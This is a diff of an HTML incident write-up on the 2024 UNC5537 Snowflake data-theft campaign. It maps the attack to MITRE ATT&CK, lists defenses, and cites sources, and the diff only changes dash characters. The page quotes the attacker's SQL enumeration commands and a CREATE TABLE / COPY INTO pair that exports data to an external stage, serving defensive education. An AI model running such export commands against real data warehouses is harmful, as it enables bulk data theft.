@@ -203,7 +203,7 @@
 
     <section class="hero hero--compact">
         <img src="../banner.png" alt="Cloud Security Office Hours Banner" width="1200" height="400" class="hero-img" decoding="async" loading="eager">
-        <h1>Snowflake / UNC5537 2024 — 2024</h1>
+        <h1>Snowflake / UNC5537 2024 - 2024</h1>
         <p>Step-by-step <a class="glossary-link" href="../glossary.html#term-kill-chain">kill chain</a> mapped to <a class="glossary-link" href="../glossary.html#term-mitre">MITRE</a> ATT&amp;CK Cloud, sourced from official post-mortems and primary technical analyses.</p>
     </section>
 
@@ -217,19 +217,19 @@
       <span class="prov-tag" style="background:rgba(34,197,94,.15);color:#4ade80;">Snowflake</span>
     </div>
     <h2 class="inc-title">UNC5537 / Snowflake – Infostealer Creds → No MFA → SHOW TABLES → Bulk Exfil → 100+ Orgs Extorted</h2>
-    <p class="inc-summary">A financially motivated threat actor tracked as UNC5537 spent months harvesting Snowflake credentials from <a class="glossary-link" href="../glossary.html#term-infostealer">infostealer</a> malware logs, then systematically logged into victim Snowflake tenants — none of which required <a class="glossary-link" href="../glossary.html#term-mfa">MFA</a> — and exfiltrated large datasets. Over 100 organisations were hit including Ticketmaster (560M records), AT&T (73M records), and Santander Bank. Snowflake itself was not breached; the attack was entirely predicated on absent MFA and reused credentials.</p>
+    <p class="inc-summary">A financially motivated threat actor tracked as UNC5537 spent months harvesting Snowflake credentials from <a class="glossary-link" href="../glossary.html#term-infostealer">infostealer</a> malware logs, then systematically logged into victim Snowflake tenants - none of which required <a class="glossary-link" href="../glossary.html#term-mfa">MFA</a> - and exfiltrated large datasets. Over 100 organisations were hit including Ticketmaster (560M records), AT&T (73M records), and Santander Bank. Snowflake itself was not breached; the attack was entirely predicated on absent MFA and reused credentials.</p>
     <div class="inc-stats">
       <div class="inc-stat"><strong>100+</strong> organisations compromised</div>
       <div class="inc-stat"><strong>560M</strong> Ticketmaster records</div>
       <div class="inc-stat"><strong>73M</strong> AT&amp;T records</div>
       <div class="inc-stat"><strong>Threat actor:</strong> UNC5537 (financially motivated, extortion-focused)</div>
     </div>
-    <a class="pm-link" href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion" target="_blank" rel="noopener">📄 Mandiant / Google — UNC5537 report ↗</a>
+    <a class="pm-link" href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion" target="_blank" rel="noopener">📄 Mandiant / Google - UNC5537 report ↗</a>
     <a class="pm-link" href="https://medium.com/snowflake/detecting-and-preventing-unauthorized-user-access-d67be8bd66f6" target="_blank" rel="noopener">📄 Snowflake security advisory ↗</a>
   </div>
   <div class="kill-chain">
 
-    <div class="phase-lbl ph-recon">🕵️ Initial Credential Acquisition — Infostealer Logs</div>
+    <div class="phase-lbl ph-recon">🕵️ Initial Credential Acquisition - Infostealer Logs</div>
     <div class="kc-step step-r">
       <div class="step-num">01</div>
       <div class="step-body">
@@ -237,28 +237,28 @@
           <div class="step-title">Snowflake credentials harvested from infostealer malware logs collected over months</div>
           <a class="mt mt-ca" href="https://attack.mitre.org/techniques/T1555/003/" target="_blank" rel="noopener">T1555.003 – Credentials from Web Browsers</a>
         </div>
-        <p class="step-desc">UNC5537 sourced valid Snowflake credentials from infostealer malware logs — RedLine, Vidar, and Lumma stealer families had infected contractor and employee devices, exfiltrating saved browser credentials including Snowflake login URLs. The logs were purchased from underground markets or obtained from prior campaigns. Mandiant confirmed some credentials were years old and still valid because passwords had never been rotated.</p>
+        <p class="step-desc">UNC5537 sourced valid Snowflake credentials from infostealer malware logs - RedLine, Vidar, and Lumma stealer families had infected contractor and employee devices, exfiltrating saved browser credentials including Snowflake login URLs. The logs were purchased from underground markets or obtained from prior campaigns. Mandiant confirmed some credentials were years old and still valid because passwords had never been rotated.</p>
         <div class="step-code">
-          <span class="hl">Malware families:</span> RedLine Stealer, Vidar, Lumma — browser credential dumpers<br>
-          <span class="hl">Credential age:</span> Some logs dated years prior to the campaign — passwords never rotated<br>
+          <span class="hl">Malware families:</span> RedLine Stealer, Vidar, Lumma - browser credential dumpers<br>
+          <span class="hl">Credential age:</span> Some logs dated years prior to the campaign - passwords never rotated<br>
           <span class="hl">Why it worked:</span> No Snowflake-side MFA requirement · No <a class="glossary-link" href="../glossary.html#term-network-policy">network policy</a> allowlisting · No anomalous-login alerting
         </div>
         <div class="step-tags"><span class="stag">Infostealer</span><span class="stag">RedLine</span><span class="stag">Credential Harvesting</span><span class="stag">T1555.003</span></div>
       </div>
     </div>
 
-    <div class="phase-lbl ph-init">⚡ <a class="glossary-link" href="../glossary.html#term-initial-access">Initial Access</a> — Valid Credentials, No MFA</div>
+    <div class="phase-lbl ph-init">⚡ <a class="glossary-link" href="../glossary.html#term-initial-access">Initial Access</a> - Valid Credentials, No MFA</div>
     <div class="kc-step step-r">
       <div class="step-num">02</div>
       <div class="step-body">
         <div class="step-hdr">
-          <div class="step-title">Attacker authenticated directly to victim Snowflake tenants — no MFA challenge</div>
+          <div class="step-title">Attacker authenticated directly to victim Snowflake tenants - no MFA challenge</div>
           <a class="mt mt-ta" href="https://attack.mitre.org/techniques/T1078/004/" target="_blank" rel="noopener">T1078.004 – Cloud Accounts</a>
         </div>
-        <p class="step-desc">Using the harvested credentials, UNC5537 authenticated to each victim's Snowflake instance. Snowflake did not enforce MFA by default at the time — it was available but opt-in. None of the compromised accounts had MFA enabled, and no network policy restricted which IPs could connect to the tenants. The attacker connected using the SnowSQL CLI and the Snowflake JDBC driver to automate credential testing at scale.</p>
+        <p class="step-desc">Using the harvested credentials, UNC5537 authenticated to each victim's Snowflake instance. Snowflake did not enforce MFA by default at the time - it was available but opt-in. None of the compromised accounts had MFA enabled, and no network policy restricted which IPs could connect to the tenants. The attacker connected using the SnowSQL CLI and the Snowflake JDBC driver to automate credential testing at scale.</p>
         <div class="step-code">
           <span class="hl">Tools used:</span> SnowSQL CLI, Snowflake JDBC driver, custom automation scripts<br>
-          <span class="hl">MFA status:</span> Not enforced — opt-in at account level, not mandated by Snowflake platform policy<br>
+          <span class="hl">MFA status:</span> Not enforced - opt-in at account level, not mandated by Snowflake platform policy<br>
           <span class="hl">Network policy:</span> No IP allowlist configured on any of the affected tenants<br>
           <span class="hl">Detection gap:</span> Logins from new IPs/countries generated no alert to account owners
         </div>
@@ -266,7 +266,7 @@
       </div>
     </div>
 
-    <div class="phase-lbl ph-disco">🔍 Discovery — Warehouse Enumeration</div>
+    <div class="phase-lbl ph-disco">🔍 Discovery - Warehouse Enumeration</div>
     <div class="kc-step step-o">
       <div class="step-num">03</div>
       <div class="step-body">
@@ -274,17 +274,17 @@
           <div class="step-title">SHOW DATABASES / SHOW SCHEMAS / SHOW TABLES used to map all accessible data</div>
           <a class="mt mt-di" href="https://attack.mitre.org/techniques/T1619/" target="_blank" rel="noopener">T1619 – Cloud Storage Object Discovery</a>
         </div>
-        <p class="step-desc">Once authenticated, UNC5537 ran Snowflake's native enumeration commands to identify all databases, schemas, and tables accessible to the compromised user. The commands are native SQL — no exploitation required. Because the accounts were often service accounts or analyst accounts with broad SELECT permissions, the full data landscape of the <a class="glossary-link" href="../glossary.html#term-tenant">tenant</a> was visible in seconds.</p>
+        <p class="step-desc">Once authenticated, UNC5537 ran Snowflake's native enumeration commands to identify all databases, schemas, and tables accessible to the compromised user. The commands are native SQL - no exploitation required. Because the accounts were often service accounts or analyst accounts with broad SELECT permissions, the full data landscape of the <a class="glossary-link" href="../glossary.html#term-tenant">tenant</a> was visible in seconds.</p>
         <div class="step-code">
           <span class="hl">Commands:</span> SHOW DATABASES; SHOW SCHEMAS IN DATABASE x; SHOW TABLES IN SCHEMA x.y;<br>
           <span class="hl">Also used:</span> SELECT * FROM INFORMATION_SCHEMA.TABLES to enumerate accessible objects<br>
-          <span class="hl">Typical finding:</span> PII tables — customer names, emails, phone numbers, payment card data, SSNs
+          <span class="hl">Typical finding:</span> PII tables - customer names, emails, phone numbers, payment card data, SSNs
         </div>
         <div class="step-tags"><span class="stag">SHOW TABLES</span><span class="stag">INFORMATION_SCHEMA</span><span class="stag">SQL Enumeration</span><span class="stag">T1619</span></div>
       </div>
     </div>
 
-    <div class="phase-lbl ph-exfil">📤 <a class="glossary-link" href="../glossary.html#term-exfiltration">Exfiltration</a> — Staged and Extracted</div>
+    <div class="phase-lbl ph-exfil">📤 <a class="glossary-link" href="../glossary.html#term-exfiltration">Exfiltration</a> - Staged and Extracted</div>
     <div class="kc-step step-c">
       <div class="step-num">04</div>
       <div class="step-body">
@@ -292,30 +292,30 @@
           <div class="step-title">Data staged with CREATE TABLE AS SELECT then exfiltrated via COPY INTO external stage</div>
           <a class="mt mt-ef" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener">T1530 – Data from Cloud Storage</a>
         </div>
-        <p class="step-desc">UNC5537 used standard Snowflake SQL to stage target data into temporary tables, then exported it via COPY INTO to an external stage (attacker-controlled <a class="glossary-link" href="../glossary.html#term-s3">S3</a> bucket or Azure Blob) or downloaded it directly via GET. Large datasets like Ticketmaster's 560M-row table were extracted over multiple sessions. Snowflake's query history log retained these commands, providing forensic visibility after the fact — but no real-time alerting fired during exfiltration.</p>
+        <p class="step-desc">UNC5537 used standard Snowflake SQL to stage target data into temporary tables, then exported it via COPY INTO to an external stage (attacker-controlled <a class="glossary-link" href="../glossary.html#term-s3">S3</a> bucket or Azure Blob) or downloaded it directly via GET. Large datasets like Ticketmaster's 560M-row table were extracted over multiple sessions. Snowflake's query history log retained these commands, providing forensic visibility after the fact - but no real-time alerting fired during exfiltration.</p>
         <div class="step-code">
-          <span class="hl">Stage 1 — staging:</span> CREATE TABLE attacker_export AS SELECT * FROM customers;<br>
-          <span class="hl">Stage 2 — export:</span> COPY INTO @external_stage/dump.csv.gz FROM attacker_export;<br>
-          <span class="hl">Scale (Ticketmaster):</span> 560M records, 1.3TB — sold on BreachForums for $500,000<br>
+          <span class="hl">Stage 1 - staging:</span> CREATE TABLE attacker_export AS SELECT * FROM customers;<br>
+          <span class="hl">Stage 2 - export:</span> COPY INTO @external_stage/dump.csv.gz FROM attacker_export;<br>
+          <span class="hl">Scale (Ticketmaster):</span> 560M records, 1.3TB - sold on BreachForums for $500,000<br>
           <span class="hl">Detection gap:</span> No <a class="glossary-link" href="../glossary.html#term-dlp">DLP</a> on Snowflake COPY INTO · No alert on large external stage writes
         </div>
         <div class="step-tags"><span class="stag">COPY INTO</span><span class="stag">External Stage</span><span class="stag">T1530</span><span class="stag">560M Records</span></div>
       </div>
     </div>
 
-    <div class="phase-lbl ph-impact">💰 Actions on Objective — Extortion</div>
+    <div class="phase-lbl ph-impact">💰 Actions on Objective - Extortion</div>
     <div class="kc-step step-p">
       <div class="step-num">05</div>
       <div class="step-body">
         <div class="step-hdr">
-          <div class="step-title">Victims contacted with data samples — ransom demanded, data sold on BreachForums when unpaid</div>
+          <div class="step-title">Victims contacted with data samples - ransom demanded, data sold on BreachForums when unpaid</div>
           <a class="mt mt-p2" href="https://attack.mitre.org/techniques/T1657/" target="_blank" rel="noopener">T1657 – Financial Theft</a>
         </div>
         <p class="step-desc">After exfiltration, UNC5537 contacted victims directly with samples of stolen data as proof, demanding payment for deletion. When victims did not pay, datasets were listed for sale on BreachForums. The Ticketmaster database was offered for $500,000; AT&T data was listed separately. Mandiant assessed UNC5537 had at least one member residing in North America and coordinated with a partner in Turkey.</p>
         <div class="step-code">
           <span class="hl">Extortion method:</span> Direct contact to victims with data samples, ransom demand<br>
-          <span class="hl">BreachForums listing:</span> Ticketmaster — 560M records, $500,000 · AT&amp;T — 73M records<br>
-          <span class="hl">Actor attribution:</span> UNC5537 — financially motivated, some members in North America and Turkey
+          <span class="hl">BreachForums listing:</span> Ticketmaster - 560M records, $500,000 · AT&amp;T - 73M records<br>
+          <span class="hl">Actor attribution:</span> UNC5537 - financially motivated, some members in North America and Turkey
         </div>
         <div class="step-tags"><span class="stag">Extortion</span><span class="stag">BreachForums</span><span class="stag">UNC5537</span><span class="stag">T1657</span></div>
       </div>
@@ -324,10 +324,10 @@
     <div class="def-box">
       <h3>🛡 How to Defend Against This Chain</h3>
       <div class="def-items">
-        <div class="def-item"><strong>Enforce MFA on all Snowflake accounts — especially service accounts.</strong> Snowflake now supports mandatory MFA policies at the account level. Enable it. This single control would have stopped the entire campaign — every victim account was compromised solely because valid credentials plus no MFA was sufficient to authenticate.</div>
+        <div class="def-item"><strong>Enforce MFA on all Snowflake accounts - especially service accounts.</strong> Snowflake now supports mandatory MFA policies at the account level. Enable it. This single control would have stopped the entire campaign - every victim account was compromised solely because valid credentials plus no MFA was sufficient to authenticate.</div>
         <div class="def-item"><strong>Configure Snowflake network policies to allowlist known source IPs.</strong> Snowflake NETWORK POLICY objects restrict which IP ranges can connect to a tenant. Lock production Snowflake access to your corporate <a class="glossary-link" href="../glossary.html#term-ingress">egress</a> IPs, VPN ranges, and known analytics tool IPs. A login from a residential or VPS IP should be impossible.</div>
         <div class="def-item"><strong>Monitor Snowflake QUERY_HISTORY for COPY INTO external stage operations.</strong> Any COPY INTO pointing at an external stage that isn't a known data pipeline target should trigger an immediate alert. Enable Snowflake's Access History and query the QUERY_HISTORY view in your <a class="glossary-link" href="../glossary.html#term-siem">SIEM</a>. This is the single most reliable detection signal for this attack pattern.</div>
-        <div class="def-item"><strong>Apply least-privilege Snowflake roles.</strong> Analyst accounts and service accounts should have READ access only to the specific schemas they need — not SELECT * on the entire data warehouse. Use Snowflake's role hierarchy and avoid granting ACCOUNTADMIN to any account used by applications or individual analysts.</div>
+        <div class="def-item"><strong>Apply least-privilege Snowflake roles.</strong> Analyst accounts and service accounts should have READ access only to the specific schemas they need - not SELECT * on the entire data warehouse. Use Snowflake's role hierarchy and avoid granting ACCOUNTADMIN to any account used by applications or individual analysts.</div>
         <div class="def-item"><strong>Subscribe to credential-exposure monitoring services.</strong> Infostealer logs containing your organisation's credentials appear on underground markets before attacks. Services like SpyCloud, Hudson Rock, or Flare detect your credentials in infostealer logs. Integrate alerts to trigger forced password resets and MFA re-enrolment.</div>
       </div>
     </div>
@@ -335,7 +335,7 @@
     <div class="src-box">
       <h4>Primary Sources</h4>
       <div class="src-links">
-        <a class="src-link" href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion" target="_blank" rel="noopener">Mandiant — UNC5537 Report</a>
+        <a class="src-link" href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion" target="_blank" rel="noopener">Mandiant - UNC5537 Report</a>
         <a class="src-link" href="https://medium.com/snowflake/detecting-and-preventing-unauthorized-user-access-d67be8bd66f6" target="_blank" rel="noopener">Snowflake Security Advisory</a>
         <a class="src-link" href="https://attack.mitre.org/techniques/T1078/004/" target="_blank" rel="noopener">MITRE T1078.004</a>
         <a class="src-link" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener">MITRE T1530</a>
